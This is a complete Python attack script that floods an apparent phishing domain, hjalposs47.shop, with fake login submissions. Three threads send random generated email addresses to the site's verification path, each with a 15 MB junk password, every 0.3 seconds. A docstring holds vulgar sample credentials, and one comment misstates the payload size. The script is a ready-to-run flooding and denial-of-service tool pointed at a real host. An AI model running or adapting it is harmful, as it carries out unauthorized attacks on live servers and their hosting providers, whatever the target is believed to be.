import random
import time
import threading
import typing

import requests

domain = "hjalposs47.shop"
path = "/verification/"

emails = ("gmail.com", "outlook.com", "yahoo.com", "protonmail.com",)
"""
email=MinEnormaSnopp@gmail.com
pass=Storpenis1234
get=Logga+in
"""

class sender:
    def __init__(self):
        self.cntr = 0
        self.mtx  = threading.Lock()


    def send(self, email, password: str, domain: str):
        requests.post(domain, data={"email": email, "pass": password, "get": "Logga in"})
        self.mtx.acquire()
        print(f"Sent request no: {self.cntr}")
        self.cntr += 1
        self.mtx.release()



with open("firstnames.txt", "r") as file_h:
    firstnames = [x.strip().lower() for x in file_h.readlines()]

with open("lastnames.txt", "r") as file_h:
    lastnames = [x.strip().lower() for x in file_h.readlines()]



fullpath = f"http://{domain}{path}"


exiting = False
with open("passlist.txt", "r") as file_h:
    passwords = [x.strip() for x in file_h.readlines()]


reqhandle = sender()

def runner():
    massivedata = b"A" * (15 * 1024 ** 2)  # 1MB
    while not exiting:
        indx = random.randint(0, len(emails) - 1)
        email = f"{firstnames[random.randint(0, len(firstnames) - 1)]}.{lastnames[random.randint(0, len(lastnames) - 1)]}@{emails[indx]}"
        password = massivedata #passwords[random.randint(0, len(passwords) - 1)]
        reqhandle.send(email, password, fullpath)
        time.sleep(0.3)




threads = 3
handles = []
for _ in range(threads):
    handle = threading.Thread(target=runner)
    handle.start()
    handles.append(handle)


for handle in handles:
    handle.join()
